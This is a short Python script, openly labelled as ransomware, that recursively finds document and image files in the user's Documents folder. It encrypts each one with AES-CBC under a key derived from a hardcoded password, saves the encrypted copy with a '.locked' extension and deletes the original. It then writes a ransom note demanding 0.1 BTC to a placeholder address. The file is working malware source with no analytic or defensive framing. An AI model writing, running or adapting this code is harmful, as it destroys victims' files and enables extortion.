import os
import sys
import base64
import shutil
import struct
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Key and IV generation function
def derive_key(password: str, salt: bytes):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

# AES encryption function
def encrypt_file(file_path, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, "rb") as f:
        plaintext = f.read()

    padding_length = 16 - (len(plaintext) % 16)
    plaintext += bytes([padding_length]) * padding_length  # PKCS7 Padding

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(file_path + ".locked", "wb") as f:
        f.write(iv + ciphertext)

    os.remove(file_path)  # Remove original file

# Target files
def find_files(directory):
    extensions = [".txt", ".docx", ".png", ".jpg", ".pdf"]
    file_list = []
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                file_list.append(os.path.join(root, file))
    return file_list

# Ransomware execution
def run_ransomware():
    target_dir = os.path.expanduser("~/Documents")  # Adjust as needed
    password = "SuperSecurePass"
    salt = os.urandom(16)
    key = derive_key(password, salt)

    with open("encryption_key.bin", "wb") as keyfile:
        keyfile.write(salt + key)

    for file in find_files(target_dir):
        encrypt_file(file, key)

    print("Files encrypted. Read the ransom note.")

# Ransom note
def ransom_note():
    note = """
    Your files have been encrypted! Pay 0.1 BTC to the following address:
    BTC ADDRESS: 123xyzFakeAddress
    """
    with open("README.txt", "w") as f:
        f.write(note)

# Run script
if __name__ == "__main__":
    run_ransomware()
    ransom_note()
